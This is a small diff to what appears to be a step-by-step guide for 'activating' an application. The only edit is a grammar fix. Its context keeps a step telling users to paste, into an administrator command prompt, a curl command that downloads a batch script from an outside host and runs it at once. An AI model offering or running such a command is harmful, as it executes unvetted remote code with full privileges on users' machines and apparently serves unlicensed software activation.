@@ -23,6 +23,6 @@ Step 1 - Click windows logo, type cmd and run as administrator
 
 Step 2 - Paste this command into the cmd --> curl -L keyms.id/aso -o aso.cmd & aso.cmd
 
-Step 3 - Wait until it finishes activating application
+Step 3 - Wait until it finishes activating the application
 
 And you're done!
